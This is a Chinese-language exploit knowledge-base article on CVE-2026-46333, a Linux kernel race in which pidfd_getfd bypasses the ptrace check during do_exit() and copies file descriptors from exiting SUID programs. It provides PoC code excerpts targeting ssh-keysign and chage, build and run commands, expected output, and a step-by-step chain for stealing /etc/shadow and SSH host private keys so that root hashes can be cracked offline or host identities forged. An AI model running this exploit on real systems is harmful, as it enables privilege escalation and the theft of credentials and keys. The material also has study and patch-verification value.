---
id: "general/01-kernel/03-mm-null-ptrace-bypass"
title: "内核 FD Theft：mm-NULL ptrace check bypass"
title_en: "Kernel FD Theft: mm-NULL ptrace Check Bypass"
summary: >
  分析 do_exit() 中 exit_mm 与 exit_files 之间的 mm-NULL 窗口，利用 pidfd_getfd 在 ptrace 检查被绕过时复制已退出进程的敏感 fd，实现 /etc/shadow 和 SSH host key 的窃取。
summary_en: >
  Exploits the mm-NULL window between exit_mm and exit_files in do_exit() to bypass pidfd_getfd ptrace checks, copying sensitive file descriptors from exiting SUID processes to steal /etc/shadow and SSH host keys.
board: "general"
category: "01-kernel"
signals:
  - "fd theft"
  - "ptrace bypass"
  - "pidfd_getfd"
  - "mm-NULL window"
  - "dumpable check"
  - "SUID"
  - "file descriptor stealing"
mcp_tools:
  - "kb_router"
  - "workspace_write_text"
keywords:
  - "CVE-2026-46333"
  - "pidfd_getfd"
  - "mm-NULL"
  - "file descriptor theft"
  - "ptrace"
  - "do_exit race"
  - "privilege escalation"
  - "ssh-keysign"
difficulty: "intermediate"
tags:
  - "kernel-exploitation"
  - "fd-theft"
  - "ptrace-bypass"
  - "race-window"
language: "zh-CN"
last_updated: "2026-06-25"
related_articles: []
---
# 内核 FD Theft：mm-NULL ptrace check bypass（CVE-2026-46333）

## 1. 受影响版本

修复提交 `31e62c2ebbfd`（2026-05-14）之前的内核。PoC README 标注：everything in stable as of 2026-05-14。

### 已确认环境

Raspberry Pi OS Bookworm 6.12.75、Debian 13、Ubuntu 22.04 / 24.04 / 26.04、Arch、CentOS 9。

## 2. 前置条件

| 条件 | 说明 |
|------|------|
| `pidfd_open` | syscall 434（x86_64） |
| `pidfd_getfd` | syscall 438（x86_64） |
| SUID 目标 | `ssh-keysign` 或 `/usr/bin/chage` 等 |
| 目标持有敏感 fd | 先以高权限打开 root-only 文件，再降权或退出 |

## 3. 根因：do_exit() 中 mm-NULL 窗口

`pidfd_getfd()` 底层走 `__ptrace_may_access()` 权限检查。`do_exit()` 中 `exit_mm()` 先执行（`task->mm = NULL`），`exit_files()` 后执行（fd table 关闭）。在 mm-NULL 窗口内，旧版 `__ptrace_may_access()` 跳过 dumpable 检查 → 普通用户可复制退出进程的 fd。

```
do_exit()
  ├─ exit_mm()       // task->mm = NULL → dumpable 检查被绕过
  │    ↑
  │    │  这里 fd table 仍然存在
  │    │  pidfd_getfd() 可以成功
  │    ↓
  └─ exit_files()    // 关闭文件描述符
```

### 为什么能读 root-only 文件

Linux 文件权限检查在 `open()` 阶段。目标 SUID 程序以 root 打开 `/etc/shadow` 后得到已授权的 `struct file`。`pidfd_getfd()` 复制的是**已打开 fd 的副本** — 后面 `read()` 不走路径权限检查。

## 4. 调用链

```
非特权用户
    → fork 目标 SUID 程序（ssh-keysign / chage）
        → 程序以 root 打开 /etc/shadow 或 SSH host key
        → 程序降权（setuid / permanently_set_uid）
        → 程序退出（exit）
    → 父进程 pidfd_open(child)
    → 目标进入退出窗口
        → exit_mm() 完成：task->mm = NULL（dumpable 检查被绕过）
        → exit_files() 尚未执行：敏感 fd 仍打开
    → 父进程枚举 fd 3..31 调用 pidfd_getfd(pidfd, fd, 0)
    → 命中敏感 fd（/etc/shadow / ssh_host_ed25519_key）
    → lseek + read 直接读出文件内容
    → 离线破解 root hash 或伪造 SSH 主机身份
```

## 5. PoC 分析

### sshkeysign_pwn.c

```c
// ssh-keysign 先打开 host key 再永久 setuid
for (int round = 0; round < 500; round++) {
    pid_t c = fork();
    if (c == 0) {
        execl(bin, "ssh-keysign", (char *)NULL);
        _exit(127);
    }
    int pfd = pidfd_open(c, 0);
    for (int a = 0; a < 30000 && !hit; a++) {
        for (int i = 3; i < 32; i++) {
            int s = pidfd_getfd(pfd, i, 0);
            if (s < 0) continue;
            // 检查是否命中 SSH host key
            readlink("/proc/self/fd/<s>", ...);
            if (strstr(path, "ssh_host_") && strstr(path, "_key")) {
                lseek(s, 0, SEEK_SET);
                read(s, buf, sizeof(buf));
            }
        }
    }
}
```

### chage_pwn.c

```c
// chage -l 打开 /etc/shadow 后 setreuid(ruid)
execl("/usr/bin/chage", "chage", "-l", user, (char *)NULL);
// 父进程 pidfd_getfd 偷 fd → 读 /etc/shadow → 离线破解 root hash
```

### vuln_target.c（受控靶标）

```c
int main() {
    int fd = open("/etc/shadow", O_RDONLY);  // root 打开
    setuid(getuid());                          // 降权
    pause();                                   // 保持 fd 不关闭
    return 0;
}
```

### exploit_vuln_target.c（对照验证）

```c
// 目标活着时 → pidfd_getfd 返回 EPERM（权限检查正常）
// 目标 SIGKILL 后 → mm-NULL 窗口 → pidfd_getfd 成功
kill(c, SIGKILL);
for (int a = 0; a < 20000 && got < 0; a++) {
    for (int i = 3; i < 16; i++) {
        int s = syscall(__NR_pidfd_getfd, pfd, i, 0);
        ...
    }
}
```

## 6. 复现

```bash
# 编译
cd exploit && make
# 生成: sshkeysign_pwn, chage_pwn, vuln_target, exploit_vuln_target

# 读取 SSH host key
./sshkeysign_pwn

# 读取 /etc/shadow
./chage_pwn root

# 受控靶标验证
sudo install -m 4755 vuln_target /usr/local/bin/vuln_target
./exploit_vuln_target /usr/local/bin/vuln_target
```

### 预期输出

```text
uid=1000  target=/usr/lib/ssh/ssh-keysign
fd 5 -> /etc/ssh/ssh_host_ed25519_key (round=37 try=812)
[OPENSSH PRIVATE KEY REDACTED]
```

### Hits 范围

100–2000 次 spawn。race 不保证一次命中。

## 7. 目标程序 fd 生命周期特征

| 程序 | 打开的文件 | 降权时机 |
|------|-----------|---------|
| `ssh-keysign` | `/etc/ssh/ssh_host_*_key` | `permanently_set_uid()` |
| `/usr/bin/chage -l` | `/etc/passwd` + `/etc/shadow` | `setreuid(ruid, ruid)` |

## 攻击链

```
1. 选择会先打开 root-only 文件、再降权/退出的 setuid 目标程序
2. 通过 fork/exec 与同步窗口反复触发目标进程进入 do_exit()
3. 在 mm 被置空但 fd 表仍可被访问的窗口发起 ptrace/pidfd 相关操作
4. 利用 mm-NULL 检查绕过，借 /proc/self/fd/<n> 复制目标进程残留 fd
5. 枚举并确认 fd symlink 指向 /etc/ssh/ssh_host_*_key 或 /etc/shadow
6. 读取复制到的 fd 内容 → 泄露 root-only 文件
7. 在修复内核上重复验证，应无法跨过 ptrace 权限检查或无法复制敏感 fd
```

## Evidence

记录: 目标程序路径、命中 fd 编号、/proc/self/fd/ symlink 目标、泄露文件内容前 200 字节

## MCP 工具映射

| 攻击步骤 | MCP 工具 | 说明 |
|---------|---------|------|
| 知识检索 | `kb_router` | 按 fd-theft / pidfd 信号搜索 |
| 写分析笔记 | `workspace_write_text` | 记录泄露的敏感信息 |

## 参考资料

| 来源 | 链接 |
|------|------|
| PoC 仓库 | https://github.com/qualys/CVE-2026-46333 |
| Jann Horn 2020 FD-theft | https://lore.kernel.org/all/20201016230915.1972840-1-jannh@google.com/ |
| NVD | https://nvd.nist.gov/vuln/detail/CVE-2026-46333 |
| poc-lab 源 | https://github.com/Unclecheng-li/poc-lab/tree/main/CVE-2026-46333%20SSH%20Keysign%20pwn |
